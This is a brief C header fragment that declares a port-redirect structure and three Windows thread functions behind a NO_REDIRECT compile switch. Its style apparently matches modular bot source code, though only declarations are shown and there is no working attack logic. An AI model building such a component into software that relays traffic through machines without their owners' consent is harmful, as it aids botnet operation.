#ifndef NO_REDIRECT
// redirect structure.
typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
} rs;

DWORD WINAPI redirect(LPVOID param);
DWORD WINAPI redirectloop(LPVOID param);
DWORD WINAPI redirectloop2(LPVOID param);
#endif
